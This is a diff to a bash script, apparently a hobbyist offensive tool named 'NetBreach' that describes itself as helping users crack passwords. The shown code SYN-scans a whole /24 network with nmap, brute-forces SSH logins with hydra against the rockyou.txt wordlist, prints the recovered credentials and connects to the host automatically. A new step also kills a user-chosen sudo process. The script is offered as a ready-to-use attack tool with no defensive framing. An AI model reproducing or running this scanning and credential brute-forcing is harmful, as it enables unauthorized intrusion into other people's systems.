@@ -41,13 +41,14 @@ trap ctrl_c SIGINT
 command_exists() {
     command -v "$1" >/dev/null 2>&1
 }
-cat output.log
 
 # Auto-connects the SSH server to the computer
-if [[ "$1" == "--auto" ]]; then
+if [[ "$1" == *"${auto}"* ]]; then
 
-    # Check if the SSH connection file exists
+    # Check if the SSH connection file exists also outputs the file with the password so the 
+    #user can see what the password is
     if [ -f "${ssh_connection}" ]; then
+        cat output.log
         userConnection=$(cat "${ssh_connection}")  # Read the hint from the file
         ssh "${userConnection}"  # Connect to the SSH server
     else
@@ -62,7 +63,7 @@ fi
 
 
 # check if the user has put --skip in the arguemnts 
-if [[ "$1" == "--skip-global" ]]; then
+if [[ "$1" == *"${skip}"* ]]; then
     echo "Skipping package check"
     sleep 4
 else
@@ -80,6 +81,10 @@ else
             read -p ">>> " install
             
             if [[ " ${yes[*]} " == *" ${install} "* ]]; then
+                ps aux | grep sudo
+                echo "Input the PID for to kill the root session to install the packages."
+                read -p ">>> " session
+                kill -9 "${session}"
                 bash requirements.sh
                 exit 1
             else
@@ -92,8 +97,8 @@ else
 fi
 
 # Check if the script is run with --help or -h
-if [ "$1" = "--help" ] || [ "$1" = "-h" ]; then
-    figlet "? HELP ?"
+if [[ "$1" == *"${HELP}"* ]]; then
+    cat Bash_Help_message.txt
     echo
     echo "+++++++++++++++Programs used+++++++++++++++"
     echo "This program will help you crack passwords"
@@ -141,19 +146,20 @@ else
             # Tells the user if they want to crack the ports that are listed in the prompt or have help if they are stuck on what to do
             NetBreach() {
                 # The logo of the program
-                figlet -f slant "NetBreach"
+                figlet "${logo} GLOBAL"
                 echo "Type the number of the port you want to scan (SSH - 22, VNC - 5900, MySQL - 3306). To scan all, type 'ALL'"
                 echo "If you want to stop the program type 'stop'."
                 read -p ">>> " service
                 
                 if [[ "${service}" == "ALL" || "${service}" == "all" || "${service}" == "*" ]]; then
+                    #tells the user that the program is scanning the network
                     echo -e "Scanning IP [${GREEN}${IP_ADDRESS}/24${NC}]"
-
+                    
                     # Tells the user that it can take up to an hour to complete the scanning process
                     echo -e "${RED}This can take up to 1 hour to complete.${NC}"
 
                     # Scan the entire network and display open ports
-                    sudo nmap -sS $IPADDR/24 -Pn -oN scan.txt --open
+                    sudo nmap -sS $IP_ADDRESS/24 -Pn -oN scan.txt --open
                     echo "Scan complete. Open ports saved to scan.txt"
                     # asks if the user want to see scan on a open file or not
                     read -p "Would you like to see the scan on a open file (Yes or No): " SeeFile
@@ -199,15 +205,15 @@ else
                 done
 
                 else
-                    echo -e "Scanning IP [${GREEN}${IP_ADDRESS}/24${NC}] on port [${GREEN}${service}${NC}]"
                     # Scan specific port
-                    sudo nmap -sS $IPADDR/24 -p $service -oN $service.txt --open
+                    echo -e "Scanning IP [${GREEN}${IP_ADDRESS}/24${NC}] on port [${GREEN}${service}${NC}]"
+                    sudo nmap -sS $IP_ADDRESS/24 -p $service -oN $service.txt --open
                     read -p "Would you like to see the ${service} on a open file (Yes or No): " SeeFile
 
                     if [[ " ${yes[*]} " == *" ${SeeFile} "* ]]; then
                         open "${service}.txt"
                     else
-                        echo -e "\n[ ${RED}${BRIGHT}-${NC} ] Ok I will not open the ${service}.txt file"
+                        echo -e "\n[ ${RED}${BRIGHT}X${NC} ] Ok I will not open the ${service}.txt file"
                         sleep 1
                     fi
                 fi
@@ -275,7 +281,7 @@ else
                     else
 
                         # Crack SSH password
-                        hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host:$port
+                        hydra -l "${user}" -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host:$port
                         # Alerts the user that the computer is trying to connect to the ssh server
                         title="Connecting to ${GREEN}${user}${NC}"
                         Connecting_To_SSH_SERVER="We are connecting you to ${GREEN}${user}${NC}. Please wait..."
